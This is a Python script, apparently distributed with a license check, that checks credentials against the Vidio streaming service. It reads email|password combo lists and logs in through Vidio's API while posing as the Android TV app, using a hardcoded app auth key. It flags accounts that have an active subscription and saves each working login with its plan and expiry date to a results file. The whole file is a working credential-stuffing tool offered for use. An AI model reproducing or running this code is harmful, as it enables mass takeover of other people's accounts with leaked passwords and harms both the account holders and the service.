import requests
import uuid
import re
from colorama import Fore, Style
from datetime import datetime
import signal
import time
import os
import ctypes
import json

cuurent_version = '1.0.0'

interrupted = False

def signal_handler(signal, frame):
    global interrupted
    interrupted = True

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def set_cmd_window_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)


def login_vid(username, password):
    headers = {
        'content-type': 'application/json',
        'x-visitor-id': str(uuid.uuid4()),
        'x-api-app-info': 'tv-android/7.1.2/1.92.1-437',
        'accept': '*/*',
        'accept-language': 'en',
        'x-api-platform': 'tv-android',
        'referer': 'androidtv-app://com.vidio.android.tv',
        'user-agent': 'tv-android/1.92.1 (437)',
        'x-api-auth': 'laZOmogezono5ogekaso5oz4Mezimew1'
    }
    
    login_data = {
        "password": password,
        "login": username
    }

    response = requests.post('https://www.vidio.com/api/login', headers=headers, json=login_data)
    login = response.json()

    if 'auth' in login and 'email' in login['auth']:
        email_login = login['auth']['email']
        token_login = login['auth']['authentication_token']

        headers['x-user-email'] = email_login
        headers['x-user-token'] = token_login

        subscription_response = requests.get('https://www.vidio.com/api/users/has_active_subscription', headers=headers)
        subscription = subscription_response.json()

        if subscription.get('has_active_subscription', False) == True:
            subscriptionku = requests.get('https://www.vidio.com/api/users/subscriptions', headers=headers)
            subscriptionkus = subscriptionku.json()
            start_sub = subscriptionkus['subscriptions'][0]['start_at']
            end_sub = subscriptionkus['subscriptions'][0]['end_at']
            iso_format = "%Y-%m-%dT%H:%M:%S.%fZ"
            desired_format = "%d-%m-%Y"

            # Parse the ISO timestamp to a datetime object
            parsed_datetime = datetime.strptime(start_sub, iso_format)
            # Parse the ISO timestamp to a datetime object
            parsed_datetime2 = datetime.strptime(end_sub, iso_format)

            # Convert the datetime object to the desired format
            desired_date_format = parsed_datetime.strftime(desired_format)
            # Convert the datetime object to the desired format
            desired_date_format2 = parsed_datetime2.strftime(desired_format)

            package = subscriptionkus['subscriptions'][0]['package']['name']
            duration = subscriptionkus['subscriptions'][0]['package']['day_duration']
            result = {
                'status': 200,
                'start': desired_date_format,
                'end': desired_date_format2,
                'package': package,
                'duration': duration
            }
        else:
            result = {
                'status': 400,
                'msg': 'Subs Tidak Ditemukan'
            }
    else:
        result = {
            'status': 403,
            'info': login['error']
        }
    return result

def load_licenses_from_json():
    try:
        with open('licenses.json', 'r') as json_file:
            licenses = json.load(json_file)
            return {
                'code': 200,
                'key': licenses['key']
            }
    except FileNotFoundError:
        return {
                'code': 404
            }
def get_public_ip():
    response = requests.get('https://api64.ipify.org?format=json')
    if response.status_code == 200:
        data = response.json()
        return data['ip']
    else:
        return None

def get_license(key):
    try:
        ipku = get_public_ip()
        base_url = 'http://178.128.111.126:3000/check-license'
        params = {'key': key, 'ip': ipku}

        response = requests.get(base_url, params=params)

        if response.status_code == 200:
            license_data = response.json()
            return {
                'code': 200,
                'datas': license_data
            }
        elif response.status_code == 403:
            return {
                'code': 403
            }
        elif response.status_code == 404:
            return {
                'code': 404
            }
        else:
            return {
                'code': 500
            }
    except Exception as e:
        return {
                'code': 500
            }
    
def save_license_to_json(license_info):
    with open('licenses.json', 'a') as json_file:
        json.dump(license_info, json_file, indent=4)

def banner():
    print(f'''{Fore.LIGHTCYAN_EX}
        _     _ _           ___ _               _             
 /\   /(_) __| (_) ___     / __\ |__   ___  ___| | _____ _ __ 
 \ \ / / |/ _` | |/ _ \   / /  | '_ \ / _ \/ __| |/ / _ \ '__|
  \ V /| | (_| | | (_) | / /___| | | |  __/ (__|   <  __/ |   
   \_/ |_|\__,_|_|\___/  \____/|_| |_|\___|\___|_|\_\___|_|   
                                                                                             
{Style.RESET_ALL}
''')

def append_to_file(filename, data):
    with open(filename, 'a') as file:
        file.write(data + '\n')

def censor_info(email, password):
    censored_email = email[:8] + '*'*(len(email)-8)  # Keep the first two characters and mask the rest
    censored_password = password[:5] + '*' * len(password)  # Mask the entire password

    return censored_email, censored_password

def gaskeun():
    with open('file.txt', 'r') as file:
        lines = file.readlines()

    arr = 0
    for datanya in lines:
        if interrupted:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {Fore.LIGHTRED_EX}Stopped..{Style.RESET_ALL}")
            break
        arr += 1
        email = datanya.split("|")[0]
        password = datanya.split("|")[1]
        valid_email = re.sub(r'\s+', '', email)
        valid_pass = re.sub(r'\s+', '', password)
        ceker = login_vid(valid_email, valid_pass)
        censored_email, censored_password = censor_info(valid_email, valid_pass)
        if ceker['status'] == 200:
            filesave = f"{valid_email}|{valid_pass}|{ceker['package']}|{ceker['end']}"
            append_to_file('result/result.txt', filesave)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [{arr}] {Fore.LIGHTGREEN_EX}[{censored_email}] - [{censored_password}] => {Fore.LIGHTYELLOW_EX} Valid! {ceker['package']} Sampai {ceker['end']}")
        elif ceker['status'] == 400:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [{arr}] {Fore.LIGHTGREEN_EX}[{censored_email}] - [{censored_password}] => {Fore.LIGHTRED_EX}Tidak ada Subscription!{Style.RESET_ALL}")
        elif ceker['status'] == 403:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [{arr}] {Fore.LIGHTGREEN_EX}[{censored_email}] - [{censored_password}] => {Fore.LIGHTRED_EX}{ceker['info']}{Style.RESET_ALL}")
        else:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [{arr}] {Fore.LIGHTGREEN_EX}[{censored_email}] - [{censored_password}] => {Fore.LIGHTRED_EX}Unknown Error!{Style.RESET_ALL}")
    

if __name__ == "__main__":
    print(f"{Fore.LIGHTGREEN_EX}Loading, Running Application..{Style.RESET_ALL}")
    custom_title = "Vidio Checker Version 1.0"
    banner()
    print(f"{Fore.LIGHTBLUE_EX}Creator: {Fore.LIGHTGREEN_EX}Bintang Nur Pradana (st4rz){Style.RESET_ALL}\n")
    # set_cmd_window_title(custom_title)
    gaskeun()
    '''licenses = load_licenses_from_json()
    if licenses['code'] == 200:
        license_info = get_license(licenses['key'])
        
        if license_info['code'] == 200:
            if license_info['datas']['data']['application']['version'] == cuurent_version:  
                clear_screen()
                banner()
                print(f"{Fore.LIGHTBLUE_EX}Halo {Fore.LIGHTGREEN_EX}{license_info['datas']['data']['name']}{Style.RESET_ALL}")
                print(f"{Fore.LIGHTBLUE_EX}Expiry Date: {Fore.LIGHTGREEN_EX}{license_info['datas']['data']['expiry']}{Style.RESET_ALL}")
                print(f"{Fore.LIGHTBLUE_EX}Application Name: {Fore.LIGHTGREEN_EX}{license_info['datas']['data']['application']['name']}{Style.RESET_ALL}")
                print(f"{Fore.LIGHTBLUE_EX}Creator: {Fore.LIGHTGREEN_EX}Bintang Nur Pradana (st4rz){Style.RESET_ALL}\n")
                print(f"{Fore.LIGHTYELLOW_EX}={Style.RESET_ALL}" * 100, "\n")
                gaskeun()
            else:
                print(f"{Fore.LIGHTRED_EX}Versi Aplikasi telah kadaluarsa, hubungi admin t.me/starfz.{Style.RESET_ALL}")
                time.sleep(5)
        elif license_info['code'] == 403:
            print(f"{Fore.LIGHTRED_EX}License has expired.{Style.RESET_ALL}")
            time.sleep(5)
        elif license_info['code'] == 404:
            print(f"{Fore.LIGHTRED_EX}License not found.{Style.RESET_ALL}")
            time.sleep(5)
        else:
            print(f"{Fore.LIGHTRED_EX}Server non-active, please ask t.me/starfz.{Style.RESET_ALL}")
            time.sleep(5)
    else:
        license_key = input('Enter license key: ')
        license_info = get_license(license_key)
        
        if license_info['code'] == 200:
            if license_info['datas']['data']['application']['version'] == cuurent_version:
                save_license_to_json({'key': license_info['datas']['data']['key']})
                clear_screen()
                banner()
                print(f"{Fore.LIGHTBLUE_EX}Halo {Fore.LIGHTGREEN_EX}{license_info['datas']['data']['name']}{Style.RESET_ALL}")
                print(f"{Fore.LIGHTBLUE_EX}Expiry Date: {Fore.LIGHTGREEN_EX}{license_info['datas']['data']['expiry']}{Style.RESET_ALL}")
                print(f"{Fore.LIGHTBLUE_EX}Application Name: {Fore.LIGHTGREEN_EX}{license_info['datas']['data']['application']['name']}{Style.RESET_ALL}")
                print(f"{Fore.LIGHTBLUE_EX}Creator: {Fore.LIGHTGREEN_EX}Bintang Nur Pradana (st4rz){Style.RESET_ALL}\n")
                print(f"{Fore.LIGHTYELLOW_EX}={Style.RESET_ALL}" * 100, "\n")
                gaskeun()
            else:
                print(f"{Fore.LIGHTRED_EX}Versi Aplikasi telah kadaluarsa, hubungi admin t.me/starfz.{Style.RESET_ALL}")
                time.sleep(5)
        elif license_info['code'] == 403:
            print(f"{Fore.LIGHTRED_EX}License has expired.{Style.RESET_ALL}")
            time.sleep(5)
        elif license_info['code'] == 404:
            print(f"{Fore.LIGHTRED_EX}License not found.{Style.RESET_ALL}")
            time.sleep(5)
        else:
            print(f"{Fore.LIGHTRED_EX}Server non-active, please ask t.me/starfz.{Style.RESET_ALL}")
            time.sleep(5)'''
